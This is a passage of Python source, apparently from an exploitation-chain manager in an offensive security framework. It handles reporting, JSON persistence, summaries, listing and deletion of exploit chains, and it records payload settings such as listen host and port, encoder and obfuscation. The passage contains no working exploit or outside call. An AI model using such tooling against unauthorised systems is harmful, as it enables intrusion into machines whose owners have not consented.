                'name': chain.name,
                'description': chain.description,
                'target': chain.target,
                'created_at': chain.created_at.isoformat(),
                'last_executed': chain.last_executed.isoformat() if chain.last_executed else None
            },
            'execution_summary': {
                'total_steps': len(chain.steps),
                'successful_steps': chain.success_count,
                'failed_steps': chain.failure_count,
                'success_rate': (chain.success_count / len(chain.steps)) * 100 if chain.steps else 0
            },
            'step_results': []
        }
        
        for step in chain.steps:
            if step.step_id in chain.results:
                result = chain.results[step.step_id]
                step_report = {
                    'step_id': step.step_id,
                    'name': step.name,
                    'status': result.status.value,
                    'start_time': result.start_time.isoformat() if result.start_time else None,
                    'end_time': result.end_time.isoformat() if result.end_time else None,
                    'duration': (result.end_time - result.start_time).total_seconds() if result.start_time and result.end_time else None,
                    'output': result.output[:1000] if result.output else "",  # Truncate long output
                    'error': result.error_message,
                    'session_info': result.session_info,
                    'artifacts': result.artifacts
                }
                report['step_results'].append(step_report)
        
        return report
    
    @handle_errors
    def save_chain_data(self, chain_id: str):
        """Save exploitation chain data"""
        if chain_id not in self.chains:
            return
        
        chain = self.chains[chain_id]
        output_file = self.output_dir / f"chain_{chain_id}_{int(time.time())}.json"
        
        data = {
            'chain_info': {
                'id': chain.chain_id,
                'name': chain.name,
                'description': chain.description,
                'target': chain.target,
                'created_at': chain.created_at.isoformat(),
                'last_executed': chain.last_executed.isoformat() if chain.last_executed else None,
                'success_count': chain.success_count,
                'failure_count': chain.failure_count
            },
            'steps': [
                {
                    'step_id': step.step_id,
                    'name': step.name,
                    'description': step.description,
                    'exploit_module': step.exploit_module,
                    'dependencies': step.dependencies,
                    'timeout': step.timeout,
                    'retry_count': step.retry_count,
                    'custom_params': step.custom_params,
                    'payload_config': {
                        'payload_type': step.payload_config.payload_type.value,
                        'target_host': step.payload_config.target_host,
                        'target_port': step.payload_config.target_port,
                        'listen_host': step.payload_config.listen_host,
                        'listen_port': step.payload_config.listen_port,
                        'encoder': step.payload_config.encoder,
                        'custom_params': step.payload_config.custom_params,
                        'obfuscated': step.payload_config.obfuscated
                    } if step.payload_config else None
                } for step in chain.steps
            ],
            'results': {
                step_id: {
                    'step_id': result.step_id,
                    'status': result.status.value,
                    'output': result.output,
                    'error_message': result.error_message,
                    'start_time': result.start_time.isoformat() if result.start_time else None,
                    'end_time': result.end_time.isoformat() if result.end_time else None,
                    'session_info': result.session_info,
                    'artifacts': result.artifacts,
                    'evidence': result.evidence
                } for step_id, result in chain.results.items()
            }
        }
        
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)
        
        self.logger.info(f"Chain data saved to {output_file}")
    
    @handle_errors
    def get_chain_summary(self, chain_id: str) -> Optional[Dict[str, Any]]:
        """Get chain execution summary"""
        if chain_id not in self.chains:
            return None
        
        chain = self.chains[chain_id]
        
        return {
            'chain_id': chain_id,
            'name': chain.name,
            'target': chain.target,
            'total_steps': len(chain.steps),
            'successful_steps': chain.success_count,
            'failed_steps': chain.failure_count,
            'last_executed': chain.last_executed.isoformat() if chain.last_executed else None,
            'active_sessions': len([s for s in self.exploit_executor.active_sessions.values() if s.get('active')])
        }
    
    @handle_errors
    def list_chains(self) -> List[Dict[str, Any]]:
        """List all exploitation chains"""
        return [self.get_chain_summary(chain_id) for chain_id in self.chains]
    
    @handle_errors
    def delete_chain(self, chain_id: str) -> bool:
        """Delete exploitation chain"""
        if chain_id in self.chains:
            del self.chains[chain_id]
            self.logger.info(f"Deleted exploitation chain: {chain_id}")
            return True
        return False


# Global exploitation chain manager instance
_exploitation_manager = None

def get_exploitation_manager() -> ExploitationChainManager:
    """Get global exploitation chain manager instance"""
    global _exploitation_manager
    if _exploitation_manager is None:
        _exploitation_manager = ExploitationChainManager()
    return _exploitation_manager